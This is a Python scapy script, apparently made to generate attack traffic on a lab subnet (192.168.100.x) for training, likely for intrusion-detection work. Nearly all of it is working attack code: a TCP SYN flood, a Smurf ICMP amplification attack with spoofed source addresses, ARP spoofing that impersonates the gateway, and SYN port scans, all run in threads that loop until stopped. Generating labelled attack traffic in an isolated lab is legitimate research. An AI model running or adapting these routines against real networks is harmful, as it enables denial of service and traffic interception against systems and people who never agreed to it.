#!/usr/bin/env python3
"""
Continuous Network Attacker - Enhanced Version
يعمل بشكل مستمر لإنتاج حركة مرور شبكة متنوعة للتدريب
"""
import os
import random
import threading
import time
import signal
import sys
from datetime import datetime
import scapy.all as scapy
from scapy.all import IP, ICMP, TCP, UDP, RandShort, send, sendp

class ContinuousAttacker:
    def __init__(self):
        self.running = True
        self.attack_stats = {
            'dos_attacks': 0,
            'smurf_attacks': 0,
            'arp_spoofing': 0,
            'nmap_scans': 0,
            'normal_traffic': 0
        }
        
        # Target IPs and their corresponding MAC addresses
        self.target_ips = [f"192.168.100.{i}" for i in range(11, 20)]
        
        # Static MACs matching each IP
        self.target_macs = {
            "192.168.100.11": "02:42:c0:a8:64:01",
            "192.168.100.12": "02:42:c0:a8:64:02",
            "192.168.100.13": "02:42:c0:a8:64:03",
            "192.168.100.14": "02:42:c0:a8:64:04",
            "192.168.100.15": "02:42:c0:a8:64:05",
            "192.168.100.16": "02:42:c0:a8:64:06",
            "192.168.100.17": "02:42:c0:a8:64:07",
            "192.168.100.18": "02:42:c0:a8:64:08",
            "192.168.100.19": "02:42:c0:a8:64:09",
            "192.168.100.20": "02:42:c0:a8:64:20"
        }
        
        self.start_time = time.time()
        
    def dos_attack(self, target_ip):
        """DoS TCP Flood Attack"""
        if not self.running:
            return
            
        try:
            print(f"🚨 Starting DoS attack on {target_ip}")
            
            # إنتاج حزم TCP متتالية بسرعة
            for i in range(50):  # تقليل العدد لتجنب الحمل الزائد
                if not self.running:
                    break
                    
                packet = IP(dst=target_ip)/TCP(
                    dport=random.choice([80, 443, 8080, 3389]), 
                    sport=RandShort(), 
                    flags="S"
                )
                send(packet, verbose=False)
                
            
            self.attack_stats['dos_attacks'] += 1
            print(f"✅ DoS attack completed on {target_ip}")
            
        except Exception as e:
            print(f"❌ Error in DoS attack: {e}")

    def smurf_attack(self, target_ip):
        """Smurf ICMP Amplification Attack"""
        if not self.running:
            return
            
        try:
            print(f"🚨 Starting Smurf attack on {target_ip}")
            broadcast_ip = "192.168.100.255"
            
            for i in range(150):
                if not self.running:
                    break
                    
                # إرسال ICMP requests مع IP مزور
                packet = IP(src=target_ip, dst=broadcast_ip)/ICMP()
                send(packet, verbose=False)
                time.sleep(0.05)  # تأخير بسيط لتجنب الحمل الزائد
                      
            self.attack_stats['smurf_attacks'] += 1
            print(f"✅ Smurf attack completed on {target_ip}")
            
        except Exception as e:
            print(f"❌ Error in Smurf attack: {e}")

    def arp_spoof(self, target_ip):
        """ARP Spoofing Attack"""
        if not self.running:
            return
            
        try:
            print(f"🚨 Starting ARP spoofing on {target_ip}")
            spoofed_ip = "192.168.100.1"  # Gateway IP
            mac = self.target_macs.get(target_ip)

            if mac:
                for i in range(50):
                    if not self.running:
                        break
                        
                    # إرسال ARP replies مزورة
                    packet = scapy.Ether(dst=mac) / scapy.ARP(
                        op=2, 
                        hwdst=mac, 
                        pdst=target_ip, 
                        psrc=spoofed_ip,
                        hwsrc="aa:bb:cc:dd:ee:ff"  # MAC مزور
                    )
                    sendp(packet, verbose=False)
                    
                self.attack_stats['arp_spoofing'] += 1
                print(f"✅ ARP spoofing completed on {target_ip}")
            else:
                print(f"⚠️ No MAC address found for {target_ip}")
                
        except Exception as e:
            print(f"❌ Error in ARP spoofing: {e}")

    def nmap_scan(self, target_ip):
        """Port Scanning (Simulated Nmap)"""
        if not self.running:
            return
            
        try:
            print(f"🚨 Starting port scan on {target_ip}")
            
            # محاكاة SYN Scan
            common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 3389, 5432, 3306]
            
            for port in common_ports:
                if not self.running:
                    break
                    
                # إرسال SYN packets لكل port
                packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                
                time.sleep(0.2)  # تأخير بسيط لمحاكاة الفحص
            
            self.attack_stats['nmap_scans'] += 1
            print(f"✅ Port scan completed on {target_ip}")
            
        except Exception as e:
            print(f"❌ Error in port scan: {e}")

    def generate_normal_traffic(self, target_ip):
        """إنتاج حركة مرور عادية"""
        if not self.running:
            return
            
        try:
            # HTTP requests عادية
            for i in range(5):
                if not self.running:
                    break
                    
                packet = IP(dst=target_ip)/TCP(dport=80, flags="PA")/"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
                send(packet, verbose=False)
                time.sleep(0.5)
            
            # DNS queries عادية
            for i in range(2):
                if not self.running:
                    break
                    
                packet = IP(dst="8.8.8.8")/UDP(dport=53)/"normal_dns_query"
                send(packet, verbose=False)
                time.sleep(0.3)
            
            self.attack_stats['normal_traffic'] += 1
            
        except Exception as e:
            print(f"❌ Error generating normal traffic: {e}")

    def attack_cycle(self, target_ip):
        while self.running:
            self.dos_attack(target_ip)
            time.sleep(2)
            self.smurf_attack(target_ip)
            time.sleep(2)
            self.nmap_scan(target_ip)
            time.sleep(2)
            self.nmap_scan(target_ip)
            self.arp_spoof(target_ip)
            time.sleep(2)
            self.dos_attack(target_ip)
            time.sleep(2)
            self.nmap_scan(target_ip)

            #self.generate_normal_traffic(target_ip)
            time.sleep(20)


    def print_stats(self):
        """طباعة إحصائيات الهجمات"""
        duration = time.time() - self.start_time
        print(f"\n📊 Attack Statistics (Running for {duration/60:.1f} minutes):")
        print(f"   🔴 DoS Attacks: {self.attack_stats['dos_attacks']}")
        print(f"   🔵 Smurf Attacks: {self.attack_stats['smurf_attacks']}")
        print(f"   🟡 ARP Spoofing: {self.attack_stats['arp_spoofing']}")
        print(f"   🟢 Port Scans: {self.attack_stats['nmap_scans']}")
        print(f"   ⚪ Normal Traffic: {self.attack_stats['normal_traffic']}")
        print(f"   📈 Total Activities: {sum(self.attack_stats.values())}")

    def start_continuous_attacks(self):
        """بدء الهجمات المستمرة"""
        print("🚀 Starting continuous network attacks...")
        print(f"🎯 Targeting {len(self.target_ips)} IPs")
        print("🔄 Attacks will run continuously until stopped")
        
        threads = []
        
        # إنشاء thread لكل IP مستهدف
        for target_ip in self.target_ips:
            thread = threading.Thread(
                target=self.attack_cycle, 
                args=(target_ip,), 
                daemon=True
            )
            threads.append(thread)
            thread.start()
            print(f"✅ Started attack thread for {target_ip}")
            
            # تأخير صغير بين بدء الـ threads
            time.sleep(1)
        
        # Thread لطباعة الإحصائيات كل دقيقة
        stats_thread = threading.Thread(target=self.stats_reporter, daemon=True)
        stats_thread.start()
        
        try:
            # انتظار الـ threads (مستمر)
            while self.running:
                time.sleep(10)
                
                # فحص حالة الـ threads
                active_threads = [t for t in threads if t.is_alive()]
                if len(active_threads) < len(threads):
                    print(f"⚠️ Some attack threads stopped. Active: {len(active_threads)}/{len(threads)}")
                
        except KeyboardInterrupt:
            print("\n🛑 Stopping attacks...")
            self.stop_attacks()

    def stats_reporter(self):
        """تقرير إحصائيات دوري"""
        while self.running:
            time.sleep(60)  # كل دقيقة
            if self.running:
                self.print_stats()

    def stop_attacks(self):
        """إيقاف جميع الهجمات"""
        print("🛑 Stopping all attacks...")
        self.running = False
        time.sleep(2)
        self.print_stats()
        print("✅ All attacks stopped")

    def signal_handler(self, signum, frame):
        """معالج إشارات النظام"""
        print(f"\n🛑 Received signal {signum}")
        self.stop_attacks()
        sys.exit(0)

def main():
    """الدالة الرئيسية"""
    print("🎯 Continuous Network Attacker")
    print("=" * 50)
    print("This tool generates continuous network traffic including:")
    print("• DoS/DDoS attacks (TCP Flood)")
    print("• Smurf attacks (ICMP Amplification)")
    print("• ARP Spoofing attacks")
    print("• Port scanning (Nmap simulation)")
    print("• Normal network traffic")
    print("=" * 50)
    
    attacker = ContinuousAttacker()
    
    # إعداد معالج الإشارات
    signal.signal(signal.SIGINT, attacker.signal_handler)
    signal.signal(signal.SIGTERM, attacker.signal_handler)
    
    try:
        attacker.start_continuous_attacks()
    except Exception as e:
        print(f"❌ Fatal error: {e}")
    finally:
        attacker.stop_attacks()

if __name__ == "__main__":
    main()